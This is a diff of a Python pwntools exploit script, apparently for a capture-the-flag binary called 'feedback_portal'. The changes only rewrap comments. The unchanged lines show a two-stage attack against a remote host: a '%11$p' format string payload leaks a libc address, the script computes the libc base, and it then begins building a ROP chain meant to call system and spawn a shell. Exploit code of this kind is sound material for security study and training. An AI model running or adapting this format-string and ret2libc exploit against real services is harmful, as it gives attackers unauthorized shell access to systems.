@@ -1,7 +1,9 @@
 #!/usr/bin/env python3
 from pwn import *
 """
-The idea here is to perform a ret2libc attack developed in 2 steps, first we calculate the libc base addres throught the FORMAT STRING then i can "pick" funtioin from libc and reuse it in order to spawn a shell
+The idea here is to perform a ret2libc attack developed in 2 steps,
+ first we calculate the libc base addres throught the FORMAT STRING then i can "pick" 
+ funtioin from libc and reuse it in order to spawn a shell
 
 """
 context.binary = elf = ELF('./feedback_portal', checksec=False)
@@ -15,7 +17,8 @@ OFFSET_TO_RIP=136
 p= remote(HOST,PORT)
 #p = process(elf.path)
 #============== 1 STAGE: LIBC_BASE  ==================#
-#The idea is to leak an address of libc(specifically the  "_IO_2_1_stderr_"), this is possible because the program is vulnerable to format strings
+#The idea is to leak an address of libc(specifically the  "_IO_2_1_stderr_"), 
+# this is possible because the program is vulnerable to format strings
 
 p.recvuntil(b'name:\n')
 p.sendline(b'%11$p') # <-- possible libc address (it start with 0x7ffXX) this address is refferred to _IO_2_1_stderr_ since i saw in gdb and calculate the format strings (5 printf parameters, from 6 starts red from strack.) 
@@ -35,7 +38,8 @@ print("LIBC_BASE",hex(libc_base))
 libc.address=libc_base# <--Now that i set the libc base address, in order to calculate the right addresses when i retrieve the gadjects
 
 #============== 2 STAGE: CALL system(bin/bash) ==================#
-#Now i can retreive the gadget needed from the libc (nowi have the right addresses) and the binary itself, in order to compose a valid rop cahin that spawn a shell
+#Now i can retreive the gadget needed from the libc (nowi have the right addresses) and the binary itself,
+#  in order to compose a valid rop cahin that spawn a shell
 
 rop= ROP(libc)
 POP_RDI   = rop.find_gadget(['pop rdi', 'ret'])[0]
